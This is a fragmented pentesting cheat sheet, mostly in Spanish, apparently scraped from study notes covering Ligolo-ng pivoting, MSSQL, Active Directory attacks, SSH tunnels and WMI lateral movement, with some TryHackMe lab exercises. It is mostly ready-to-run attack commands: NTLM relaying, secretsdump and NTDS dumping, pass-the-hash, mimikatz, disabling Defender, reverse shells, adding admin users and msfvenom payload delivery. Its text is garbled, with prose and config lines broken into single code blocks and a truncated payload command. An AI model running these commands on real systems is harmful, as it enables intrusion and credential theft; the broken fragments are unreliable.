#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
.\ligolo-agent.exe -connect <C2>:11601 -accept-fingerprint <HASH>
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
.\ligolo-agent.exe -connect tu_IP:11601
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
ifconfig
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo ip route add 192.168.10.0/24 dev ligolo0
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
nmap -Pn -n -sV 192.168.10.0/24
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
After=network.target
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
Type=simple
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
ExecStart=/usr/bin/ligolo-proxy -selfcert
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
Restart=on-failure
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
User=root
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
WantedBy=multi-user.target
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
mkdir -p ~/tools/ligolo/windows
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
cd ~/tools/ligolo/windows
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
zip ligolo-windows.zip ligolo-agent.exe wintun.dll
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
.\ligolo-agent.exe -connect <IP_PROXY>:11601
```

#### Command execution
```bash
ligolo-agent.exe
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
use auxiliary/scanner/mssql/mssql_ping
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
set rhosts 10.129.201.248
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
python3 mssqlclient.py sa:Password123@10.129.201.248
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
python3 mssqlclient.py 'DOMAIN/user:LMHASH:NTHASH@10.10.10.X'
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
EXEC xp_cmdshell 'powershell -c whoami';
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
EXEC('xp_cmdshell ''whoami''') AT LINKEDSERVER;
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
EXEC xp_cmdshell 'whoami /priv';
```

#### 🛢️ MICROSOFT SQL SERVER (MSSQL) – COMPLETE PENTESTING GUIDE
```bash
hydra -L users.txt -P passwords.txt mssql://10.10.X.X
```

#### Cliente CLI multiplataforma.
```bash
mssql-cli
```

#### 📁 NFS – Network File System (Complete Guide)
```bash
cat /etc/exports
```

#### 📁 NFS – Network File System (Complete Guide)
```bash
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
sudo nmap -p- -Pn -sS -n -vvv --min-rate 5000 192.168.1.1 -oG all_ports
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=smb* -p 445,139 192.168.1.1 -oN smb_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=ldap* -p 389,636 192.168.1.1 -oN ldap_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=rdp* -p 3389 192.168.1.1 -oN rdp_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=kerberos* -p 88 192.168.1.1 -oN kerberos_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 -u "" -p "" --shares
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u "guest" -p "" --pass-pol
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!' --shares
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.56.10 --pass-pol
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u user -p pass --local-groups
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u user -p pass --loggedon-users
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
enum4linux -a 192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
enum4linux -U 192.168.1.1 # Solo usuarios
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
enum4linux -S 192.168.1.1 # Solo shares
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
kerbrute userenum --dc dc.domain.com -d domain.com users.txt
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
kerbrute passwordspray -d domain.com users.txt 'Password123!'
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
ldapsearch -h 192.168.1.1 -x -b "dc=domain,dc=com"
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
ldapsearch -h 192.168.1.1 -x -b "dc=domain,dc=com" "(objectClass=user)"
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
sudo responder -I eth0 -wrf
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay.txt
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-ntlmrelayx -tf relay.txt -socks -smb2support -debug
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-ntlmrelayx -tf relay.txt -c "ipconfig" -smb2support
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
sudo mitm6 -i eth0 -d domain.local --debug
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-ntlmrelayx -6 -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password --sam
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password --ntds drsuapi
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password --ntds vss
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-secretsdump domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -x 'whoami'
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -X 'ipconfig'
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -x 'systeminfo' --exec-method smbexec
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -x 'whoami' --exec-method wmiexec
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb -L
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -M mimikatz
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -M powerview
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -M met_inject -o LHOST=192.168.1.100 LPORT=4444
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
msfconsole -q
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
use exploit/multi/handler
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set payload windows/meterpreter/reverse_https
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set LHOST 192.168.1.100
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set LPORT 4444
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set ExitOnSession false
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
exploit -j
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
listeners
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Name http
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Host 192.168.1.100
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Port 8080
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
execute
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
usestager multi/launcher
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Listener http
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-psexec domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-wmiexec domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-smbexec domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c domain.com/administrator@192.168.1.2
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-GetUserSPNs domain.com/user:password -dc-ip 192.168.1.1 -request
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip 192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
SharpHound.exe -c All
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
bloodhound-python -u user -p password -d domain.com -ns 192.168.1.1 -c All
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

#### 🔵 Habilitar y Deshabilitar RDP con CrackMapExec (CME / NetExec)
```bash
sudo crackmapexec smb 10.46.136.19 -u "USN223" -p "Barcelona2024.223" -M rdp -o ACTION=enable
```

#### 🔵 Habilitar y Deshabilitar RDP con CrackMapExec (CME / NetExec)
```bash
sudo crackmapexec smb 10.46.136.19 -u "USN223" -p "Barcelona2024.223" -M rdp -o ACTION=disable
```

#### 🔵 Conexión RDP con credenciales (xfreerdp / xfreerdp3)
```bash
xfreerdp /v:10.46.142.8 /u:usn223 /p:Barcelona2024.223
```

#### 🔵 Conexión RDP con credenciales (xfreerdp / xfreerdp3)
```bash
xfreerdp /v:10.46.142.8 /u:usn223 /p:Barcelona2024.223 /drive:shared,/home/kali
```

#### 🔵 Conexión RDP usando Hash NTLM (Pass-The-Hash)
```bash
xfreerdp /v:10.46.142.8 /u:Administrator /pth:e591b92ad4e4774e1db7782ffbc1954c /cert:ignore
```

#### 🔵 Habilitar / Deshabilitar "Restricted Admin Mode"
```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

#### 🔵 Habilitar / Deshabilitar "Restricted Admin Mode"
```bash
reg delete HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /f
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
sudo nc -lvnp 443
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
nc -lvnp <puerto> -e "cmd.exe"
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
socat TCP-L:<puerto> EXEC:"bash -li"
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
mkfifo /tmp/f; nc -lvnp <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<puerto>);..."
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
net user <usuario> <contraseña> /add
```

#### 🔵 Shells Remotos y Técnicas de Estabilización
```bash
net localgroup administrators <usuario> /add
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa root@10.10.74.180
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.74.180
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group1-sha1 root@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o Protocol=2 user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o StrictHostKeyChecking=no user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o UserKnownHostsFile=/dev/null user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -c aes256-ctr user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -c aes128-ctr,aes192-ctr,aes256-ctr user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -p 2222 user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -i id_rsa user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -vvv user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -L 8080:127.0.0.1:80 user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -R 4444:127.0.0.1:4444 user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -D 1080 user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
Host victima
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh victima
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh-keygen -t rsa -b 4096
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh-copy-id user@IP
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh user@IP "id && whoami && uname -a"
```

#### 🔐 SSH — Métodos de Conexión, Compatibilidad y Opciones Avanzadas
```bash
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@IP
```

#### Command execution
```bash
ssh-rsa
```

#### Command execution
```bash
ssh-dss
```

#### 🔵 Túneles SSH y Técnicas de Pivoting
```bash
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

#### 🔵 Túneles SSH y Técnicas de Pivoting
```bash
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

#### 🔵 Túneles SSH y Técnicas de Pivoting
```bash
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

#### 🔵 Túneles SSH y Técnicas de Pivoting
```bash
ssh tunneluser@1.1.1.1 -R 9050 -N
```

#### 🔵 Túneles SSH y Técnicas de Pivoting
```bash
PsExec64.exe -s cmd.exe
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
ssh tunneluser@ATTACKER_IP
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
use windows/http/rejetto_hfs_exec
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set payload windows/shell_reverse_tcp
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set lhost thmjmp2.za.tryhackme.com
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set ReverseListenerBindAddress 127.0.0.1
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set lport 7878
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set srvhost 127.0.0.1
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set srvport 6666
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set rhosts 127.0.0.1
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
set rport 8888
```

#### 🟦 Ejercicio THM — Pivoting Avanzado SSH + SOCAT + METASPLOIT
```bash
exploit
```

#### 🔵 SSH: Conceptos base
```bash
ssh user@host
```

#### 🔵 SSH: Conceptos base
```bash
ssh user@host -p 2222
```

#### 🔵 SSH: Conceptos base
```bash
ssh -i id_rsa user@host
```

#### 🔵 SSH: Conceptos base
```bash
ssh -vvv user@host
```

#### 🔵 SSH: Conceptos base
```bash
ssh -A user@host # reenviar agente (pivoting)
```

#### 🔵 SSH: Conceptos base
```bash
ssh -o StrictHostKeyChecking=no user@host
```

#### 🔵 SSH: Conceptos base
```bash
ssh -o PreferredAuthentications=password user@host
```

#### 🔵 SSH -D — Proxy SOCKS / Pivoting
```bash
ssh -D 1080 user@remote
```

#### 🔵 SSH -L — Túnel local (Local Port Forwarding)
```bash
ssh -L local_port:dest_ip:dest_port user@remote
```

#### 🔵 SSH -L — Túnel local (Local Port Forwarding)
```bash
ssh -L 8080:10.10.10.25:80 user@remote
```

#### 🔵 SSH -R — Túnel remoto (Remote Port Forwarding)
```bash
ssh -R remote_ip:remote_port:local_ip:local_port user@remote
```

#### 🔵 SSH -R — Túnel remoto (Remote Port Forwarding)
```bash
ssh -R 0.0.0.0:4444:127.0.0.1:80 user@remote
```

#### 🔵 Gestión de Diccionarios (Listas de palabras)
```bash
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

#### 🔵 Gestión de Diccionarios (Listas de palabras)
```bash
cat file1.txt file2.txt file3.txt > combined_list.txt
```

#### 🔵 Gestión de Diccionarios (Listas de palabras)
```bash
git clone https://github.com/therodri2/username_generator.git
```

#### 🔵 Gestión de Diccionarios (Listas de palabras)
```bash
python3 username_generator.py -w users.lst
```

#### 🔵 Hashing y Cracking (Hashcat / John)
```bash
hashcat -a 0 -m 0 hash diccionario.txt # MD5
```

#### 🔵 Hashing y Cracking (Hashcat / John)
```bash
hashcat -a 3 -m 0 hash ?d?d?d?d # máscara
```

#### 🔵 Hashing y Cracking (Hashcat / John)
```bash
john --wordlist=list.txt --rules=best64 --stdout
```

#### 🔵 Hashing y Cracking (Hashcat / John)
```bash
john --rules=KoreLogic --stdout
```

#### 🔵 Password Spraying
```bash
hydra -L users.txt -p Spring2021 10.10.10.10 ssh
```

#### 🔵 Password Spraying
```bash
python3 RDPassSpray.py -U users.txt -p Pass123! -d DOMAIN -T servers.txt
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$username = 'Administrator'
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$password = 'Mypass123'
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Opt = New-CimSessionOption -Protocol DCOM
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
wmic /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name='THMService2'"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -InputObject $Service -MethodName StopService
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Command = "cmd.exe"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Args = "/c net user munra22 aSdf1234 /add"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=C:\Windows\myinstaller.msi
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
LPORT=4445 -f msi > myinstaller.msi
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
smbclient -c 'put myinstaller.msi' -U USER -W ZA '//thmiis.za.tryhackme.com/admin$/'
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
set payload windows/x64/shell_reverse_tcp
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
set LHOST <IP>
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
set LPORT 4445
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$username = 't1_corine.waters'
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$password = 'Korine.1994'
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
$Session = New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt
```

#### 🟪 WMI — Técnicas de Administración Remota (Lateral Movement)
```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = "C:\Windows\myinstaller.msi" }
```

#### Command execution
```bash
wget <URL_DEL_ASSET_DEL_PROXY_LINUX>.tar.gz
```

#### Command execution
```bash
chmod +x proxy ligolo-ng  # o el nombre del binario descargado
```

#### Command execution
```bash
.\ligolo-agent.exe -connect atacante_c2:11601
```

#### Command execution
```bash
.\ligolo-agent.exe -connect atacante_c2:11601 -accept-fingerprint D0055...B692E0FC
```

#### Command execution
```bash
Ver sesiones:
```

#### Command execution
```bash
Para usar nmap por la TUN (sin proxychains): nmap -Pn -n -sV 192.168.10.0/24 (ten en cuenta el caveat de nmap con SYN vs TCP connect; usa -unprivileged si procede). GitHub+1
```

#### Command execution
```bash
Documentación Quickstart (comandos, TLS, creación de interfaces, ejemplos). docs.ligolo.ng
```

#### Command execution
```bash
Guías/tutoriales y walk‑throughs prácticos (ej.: StationX / hackingarticles / blogs) para ejemplos de pivoting y doble‑pivot. StationX+1
```

#### Command execution
```bash
(La sintaxis exacta puede variar ligeramente por versión; -h/--help muestra las opciones).
```

#### Command execution
```bash
Ajusta la ruta al binario si procede (/usr/bin/ligolo-proxy):
```

#### Command execution
```bash
Baja los binarios oficiales desde la página de Releases del repositorio oficial de Ligolo‑NG — ahí encontrarás los assets ya compilados para Linux/macOS/Windows. Ve la sección Releases y descarga el agent para Windows (x64 o x86 según la arquitectura). GitHub+1
```

#### Command execution
```bash
Wintun (wintun.dll) — para que el agent cree la interfaz TUN en Windows necesitas la DLL de Wintun (wintun.dll). Descárgala y colócala en la misma carpeta que ligolo-agent.exe. La web oficial de Wintun indica que el archivo wintun.dll debe estar junto al ejecutable. GitHub+1
```

#### Command execution
```bash
En Windows (target): coloca ligolo-agent.exe y wintun.dll en la misma carpeta.
```

#### Command execution
```bash
ssh -D 1080 user@remote_host
```

#### Command execution
```bash
ssh -L local_port:destination_ip:destination_port user@remote_host
```

#### Command execution
```bash
ssh -R remote_ip:remote_port:local_ip:local_port user@remote_host
```

#### Command execution
```bash
ssh username@hostname -p port_number
```

#### Command execution
```bash
ssh -L 8080:localhost:80 user@remote_host
```

#### Command execution
```bash
SSH -D (Proxy Dinámico)
```

#### Command execution
```bash
SSH -L (Túnel Local)
```

#### Command execution
```bash
SSH -R (Túnel Remoto)
```

#### Command execution
```bash
A continuación, construiremos el wget comando que queremos ejecutar a través de la inyección en CONFLUENCE01. Este comando descargará el cincel binario a /tmp/chisel y hacerlo ejecutable:
```

#### Command execution
```bash
Ahora que tenemos el binario Chisel tanto en nuestra máquina Kali como en la objetivo, podemos ejecutarlos. En la máquina Kali, comenzaremos el binario como servidor con el servidor subcomando, junto con el puerto de enlace (--puerto) y el --reverso bandera para permitir el puerto inverso adelante.
```

#### Command execution
```bash
